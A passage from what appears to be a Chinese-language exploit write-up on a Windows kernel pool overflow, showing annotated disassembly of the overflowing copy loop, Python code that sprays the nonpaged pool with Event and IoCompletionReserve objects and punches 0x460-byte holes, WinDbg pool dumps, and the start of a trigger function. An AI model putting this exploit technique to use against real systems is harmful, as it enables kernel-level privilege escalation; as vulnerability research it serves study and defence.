+.text:004199CD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;eax
+.text:004199CF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_4199ED
+.text:004199D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;edx
+.text:004199D3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;[ebx+1Ch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;index&nbsp;offset&nbsp;for&nbsp;the&nbsp;first&nbsp;write
+.text:004199D6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;ebx
+.text:004199D8
+.text:004199D8&nbsp;loc_4199D8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;sub_41998E+5D
+.text:004199D8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[esi+ecx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;load&nbsp;the&nbsp;first&nbsp;write&nbsp;value&nbsp;from&nbsp;the&nbsp;buffer
+.text:004199DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;copy&nbsp;loop&nbsp;index
+.text:004199DC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ecx],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;first&nbsp;dword&nbsp;write
+.text:004199DE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;[ecx+8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;set&nbsp;the&nbsp;index&nbsp;into&nbsp;our&nbsp;overflown&nbsp;buffer
+.text:004199E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[esi+ecx-4]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;load&nbsp;the&nbsp;second&nbsp;write&nbsp;value&nbsp;from&nbsp;the&nbsp;buffer
+.text:004199E5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ecx-4],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;second&nbsp;dword&nbsp;write
+.text:004199E8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;[ebx+18h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;compare&nbsp;against&nbsp;our&nbsp;controlled&nbsp;size
+.text:004199EB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_4199D8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;jump&nbsp;back&nbsp;into&nbsp;loop</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">负责复制的循环，实际上会为每次循环（qword）复制8个字节，并溢出大小为0x460（0x458 + 0x8字节头）的缓冲区。<strong>复制的大小，直接是攻击者在输入缓冲区控制部分的大小</strong>。不存在整数溢出，也并没有将其存储在不易被找到的地方。我们可以看到，0x004199E8的大小，就是相应缓冲区中，从+0x18偏移量控制部分的大小。这样一来，利用就变得尤为简单。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们可以借助TypeIndex对象覆盖的方式来进行这一漏洞的利用，具体来说是使用内核对象，覆盖存储在_OBJECT_HEADER中的TypeIndex。更详细的内容，可以参考文末我引用的文章。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以往我们使用的一些常用对象都是Event对象（大小为0x40）和IoCompletionReserve对象（大小为0x60），常用的利用方式是像这样：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1. &nbsp; &nbsp; 用大小为X的对象造成池喷射，填满内存页；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2. &nbsp; &nbsp; 通过立即释放内存（free）或减少对象的引用计数（release，不会立即释放）相邻的对象，以触发coalescing，从而达到目标区块要求的大小（在本例中是0x460）；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3. &nbsp; &nbsp; 分配和溢出缓冲区，这样有一定几率可以消除下一个对象的_OBJECT_HEADER，从而利用TypeIndex。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">举例来说，如果溢出的缓冲区大小是0x200，就可以分配一组Event对象，并释放（free）其中的0x8（因为0x40 * 0x8 == 0x200），这样一来我们就可以在其中进行分配和溢出。所以，我们假设需要的内核对象，是池大小的n次幂。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但问题是，通过这种方式有时并不会有效，例如我们的池大小是0x460，如果我们这样的话：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">&gt;&gt;&gt;&nbsp;0x460&nbsp;%&nbsp;0x40
+32
+&gt;&gt;&gt;&nbsp;0x460&nbsp;%&nbsp;0x60
+64
+&gt;&gt;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">结果表明，总会有剩余的一部分空间，也就是说我们不能使其产生一个特定大小的区块。后来，我发现有一种方法可以解决该问题，我们可以搜索具有目标缓冲区大小的n次幂的内核对象，并使用这些找到的对象。经过搜寻，我发现了另外两个内核对象：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">#&nbsp;1
+type&nbsp;=&nbsp;&quot;Job&quot;
+size&nbsp;=&nbsp;0x168
+&nbsp;
+windll.kernel32.CreateJobObjectW(None,&nbsp;None)
+&nbsp;
+#&nbsp;2
+type&nbsp;=&nbsp;&quot;Timer&quot;
+size&nbsp;=&nbsp;0xc8
+&nbsp;
+windll.kernel32.CreateWaitableTimerW(None,&nbsp;0,&nbsp;None)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然而，这些大小也同样不能使用，因为它们没有满足要求。经过一段时间的测试，我意识到，可以采用这样的方式：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">&gt;&gt;&gt;&nbsp;0x460&nbsp;%&nbsp;0xa0
+0
+&gt;&gt;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这样一来，0xa0就可以均匀地分成几个0x460，那么我们再将Event和IoCompletionReserve对象结合起来（0x40 + 0x60 = 0xa0），就能够实现！</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">喷射过程</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><pre class="brush:python;toolbar:false">def&nbsp;we_can_spray():
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;Spray&nbsp;the&nbsp;Kernel&nbsp;Pool&nbsp;with&nbsp;IoCompletionReserve&nbsp;and&nbsp;Event&nbsp;Objects.
+&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;IoCompletionReserve&nbsp;object&nbsp;is&nbsp;0x60&nbsp;and&nbsp;Event&nbsp;object&nbsp;is&nbsp;0x40&nbsp;bytes&nbsp;in&nbsp;length.
+&nbsp;&nbsp;&nbsp;&nbsp;These&nbsp;are&nbsp;allocated&nbsp;from&nbsp;the&nbsp;Nonpaged&nbsp;kernel&nbsp;pool.
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;handles&nbsp;=&nbsp;[]
+&nbsp;&nbsp;&nbsp;&nbsp;IO_COMPLETION_OBJECT&nbsp;=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0,&nbsp;25000):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;handles.append(windll.kernel32.CreateEventA(0,0,0,0))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hHandle&nbsp;=&nbsp;HANDLE(0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;handles.append(ntdll.NtAllocateReserveObject(byref(hHandle),&nbsp;0x0,&nbsp;IO_COMPLETION_OBJECT))
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;could&nbsp;do&nbsp;with&nbsp;some&nbsp;better&nbsp;validation
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(handles)&nbsp;&gt;&nbsp;0:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;False</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个函数可以喷出50000个对象，其中包括25000个Event对象和25000个IoCompletionReserve对象。在WinDBG中，看起来非常炫酷：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;!pool&nbsp;85d1f000
+Pool&nbsp;page&nbsp;85d1f000&nbsp;region&nbsp;is&nbsp;Nonpaged&nbsp;pool
+*85d1f000&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Allocated)&nbsp;*IoCo&nbsp;(Protected)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Owning&nbsp;component&nbsp;:&nbsp;Unknown&nbsp;(update&nbsp;pooltag.txt)
+&nbsp;85d1f060&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;---&nbsp;chunk&nbsp;first&nbsp;allocated&nbsp;in&nbsp;the&nbsp;page
+&nbsp;85d1f0c0&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+&nbsp;85d1f100&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)
+&nbsp;85d1f160&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+......
+&nbsp;85d1ff60&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)
+&nbsp;85d1ffc0&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)</pre><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构建洞</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">“IoCo”标志代表IoCompletionReserve对象，“Even”标志代表Event对象。请注意，我们第一个区块的偏移量是0x60，这就是我们开始释放（free）的偏移量。如果我们释放一组IoCompletionReserve和Event对象，那么我们的计算结果便是：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">&gt;&gt;&gt;&nbsp;&quot;0x%x&quot;&nbsp;%&nbsp;(0x7&nbsp;*&nbsp;0xa0)
+&#39;0x460&#39;
+&gt;&gt;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">此时，会产生我们所希望的大小。让我们迅速来看看如果我们只释放接下来的7个IoCompletionReserve对象后会怎么样：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;!pool&nbsp;85d1f000
+Pool&nbsp;page&nbsp;85d1f000&nbsp;region&nbsp;is&nbsp;Nonpaged&nbsp;pool
+*85d1f000&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Allocated)&nbsp;*IoCo&nbsp;(Protected)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Owning&nbsp;component&nbsp;:&nbsp;Unknown&nbsp;(update&nbsp;pooltag.txt)
+&nbsp;85d1f060&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoCo
+&nbsp;85d1f0c0&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+&nbsp;85d1f100&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoCo
+&nbsp;85d1f160&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+......
+&nbsp;85d1f420&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoCo
+&nbsp;85d1f480&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+&nbsp;85d1f4c0&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)
+&nbsp;85d1f520&nbsp;&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;&nbsp;&nbsp;Even&nbsp;&nbsp;(Protected)
+......
+&nbsp;85d1ff60&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)
+&nbsp;85d1ffc0&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看出，我们已经拥有很多已被释放的块，但它们是各自独立的。但是，我们仍需要把它们合并成一个0x460的区块。我们首先将区块的偏移量设置为0x60（第一个指向0xXXXXY060）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bin&nbsp;=&nbsp;[]
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;object&nbsp;sizes
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CreateEvent_size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x40
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IoCompletionReserve_size&nbsp;=&nbsp;0x60
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;combined_size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;CreateEvent_size&nbsp;+&nbsp;IoCompletionReserve_size
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;after&nbsp;the&nbsp;0x20&nbsp;chunk&nbsp;hole,&nbsp;the&nbsp;first&nbsp;object&nbsp;will&nbsp;be&nbsp;the&nbsp;IoCompletionReserve&nbsp;object
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset&nbsp;=&nbsp;IoCompletionReserve_size&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(offset,&nbsp;offset&nbsp;+&nbsp;(7&nbsp;*&nbsp;combined_size),&nbsp;combined_size):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;chunks&nbsp;need&nbsp;to&nbsp;be&nbsp;next&nbsp;to&nbsp;each&nbsp;other&nbsp;for&nbsp;the&nbsp;coalesce&nbsp;to&nbsp;take&nbsp;effect
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bin.append(khandlesd[obj&nbsp;+&nbsp;i])
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bin.append(khandlesd[obj&nbsp;+&nbsp;i&nbsp;-&nbsp;IoCompletionReserve_size])
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;KeyError:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;make&nbsp;sure&nbsp;it&#39;s&nbsp;contiguously&nbsp;allocated&nbsp;memory
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(tuple(bin))&nbsp;==&nbsp;14:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;holes.append(tuple(bin))
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;make&nbsp;the&nbsp;holes&nbsp;to&nbsp;fill
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;hole&nbsp;in&nbsp;holes:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;handle&nbsp;in&nbsp;hole:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kernel32.CloseHandle(handle)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在我们释放函数的同时，在池中打洞，并获得我们所期待的释放块。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;!pool&nbsp;8674e000
+Pool&nbsp;page&nbsp;8674e000&nbsp;region&nbsp;is&nbsp;Nonpaged&nbsp;pool
+*8674e000&nbsp;size:&nbsp;&nbsp;460&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;(Free)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Io&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;--&nbsp;0x460&nbsp;chunk&nbsp;is&nbsp;free
+&nbsp;&nbsp;&nbsp;&nbsp;Pooltag&nbsp;Io&nbsp;&nbsp;&nbsp;:&nbsp;general&nbsp;IO&nbsp;allocations,&nbsp;Binary&nbsp;:&nbsp;nt!io
+&nbsp;8674e460&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;460&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)
+&nbsp;8674e4c0&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+......
+&nbsp;8674ef60&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;Even&nbsp;(Protected)
+&nbsp;8674efa0&nbsp;size:&nbsp;&nbsp;&nbsp;60&nbsp;previous&nbsp;size:&nbsp;&nbsp;&nbsp;40&nbsp;&nbsp;(Allocated)&nbsp;&nbsp;IoCo&nbsp;(Protected)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在此时，释放的区块已经合并，并且拥有一个完美的大小，接下来就可以进行分配和覆盖。</span></p><p style="white-space: normal;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对已释放区块的分配和覆盖</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><pre class="brush:python;toolbar:false">def&nbsp;we_can_trigger_the_pool_overflow():
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;triggers&nbsp;the&nbsp;pool&nbsp;overflow&nbsp;vulnerability&nbsp;using&nbsp;a&nbsp;buffer&nbsp;of&nbsp;size&nbsp;0x460.
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;GENERIC_READ&nbsp;&nbsp;=&nbsp;0x80000000
+&nbsp;&nbsp;&nbsp;&nbsp;GENERIC_WRITE&nbsp;=&nbsp;0x40000000
